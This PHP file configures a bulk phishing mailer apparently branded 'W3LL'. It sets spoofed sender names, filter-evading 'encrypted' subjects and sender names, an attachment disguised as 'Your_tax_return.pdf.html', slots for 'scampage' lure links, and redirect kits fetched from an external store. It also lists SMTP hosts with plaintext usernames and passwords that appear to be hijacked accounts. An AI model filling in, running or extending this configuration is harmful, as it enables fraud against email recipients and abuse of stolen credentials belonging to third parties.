```<?php
/* W3LL Features SETUP */

// PLEASE READ FILE [README.txt] BEFORE USE


//Please Fill your token here
$uToken = "1oximJ3qVaMgsykuQX2K90Un4eAtr85w"; // 

//Setup
$W3LL_setup = [

"fromname"=> [

// MULTI FROM NAME

"testtest", //FROMNAME 1


],

"frommail"=> "noreply@hsdfjh.com",

"subject"=> [

// MULTI SUBJECT

"okokokdkjfksfjcx", //SUBJECT 1

],

"mail_list"=> "file/W3LL_MAILLIST/W3LL_MAIL.txt","msgfile"=> "file/W3LL_LETTER/testing.html", "attach" => "file/attachment/Your_tax_return.pdf.html",

"scampage"=> [

// IF YOU WANT USE MULTI LINK YOU CAN USE DIFFRENT LINK BELLOW IF YOU JUST HV 1 LINK U SHOULD PUT THAT 1 LINK 5 TIMES

"www.google.com", //link 1
"www.google.com", //link 2
"www.google.com", //link 3
"www.google.com", //link 4
"www.google.com", //link 5
],

"priority"=> 1,   // (1= High Priority.  0 = Normal Priority.)

"sleeptime"=> 5, // (Delay Per Email, Default 5)

"ratio" => 1, // (Ratio Email Per Delay, Default 1)

"userremoveline" => 0, // (1= Remove Spammed Email From List.)

"filesend" => 0, // (1= Send Attachment File.)

"redirect" => 1, //(1= Use Old Redirect (Dont Use w3ll.php): https://w3llstore.co/redirect1.zip. 2= Use New Redirect (Use w3ll.php): https://w3llstore.co/redirect.zip)

"subject_encrypt" => 1, //(1= Encrypt Email Subject)

"fromname_encrypt" => 1, //(1= Encrypt Email Fromname)

"replacement" => 1, //(1= Use Replacement Function. Ex:++w3ll_short++)

];

/* END */

/* W3LL SMTP SETUP */

// FILL ALL WITH SMTP

$smtp_acc = [


// FOR USE MULTI SMTP YOU SHOULD PUT 10 DIFFRENT SMTP DOWN BELOW (WITH DIFFRENT DOMAIN OF SMTP)

["host" => "smtp.ikedashigyo.co.jp","port" => "587","username" => "kochi0231@ikedashigyo.co.jp","password" => "kochi0231"],

["host" => "smtp.dsl.pipex.com","port" => "587","username" => "auwf45@dsl.pipex.com","password" => "bungle12"],

["host" => "smtp.dsl.pipex.com","port" => "587","username" => "auwf45@dsl.pipex.com","password" => "bungle12"],

["host" => "smtp.dsl.pipex.com","port" => "587","username" => "auwf45@dsl.pipex.com","password" => "bungle12"],

["host" => "smtp.dsl.pipex.com","port" => "587","username" => "auwf45@dsl.pipex.com","password" => "bungle12"],

["host" => "smtp.dsl.pipex.com","port" => "587","username" => "auwf45@dsl.pipex.com","password" => "bungle12"],

["host" => "smtp.dsl.pipex.com","port" => "587","username" => "auwf45@dsl.pipex.com","password" => "bungle12"],

["host" => "smtp.dsl.pipex.com","port" => "587","username" => "auwf45@dsl.pipex.com","password" => "bungle12"],

["host" => "smtp.dsl.pipex.com","port" => "587","username" => "auwf45@dsl.pipex.com","password" => "bungle12"],

["host" => "smtp.dsl.pipex.com","port" => "587","username" => "auwf45@dsl.pipex.com","password" => "bungle12"],
];


/* END */

?>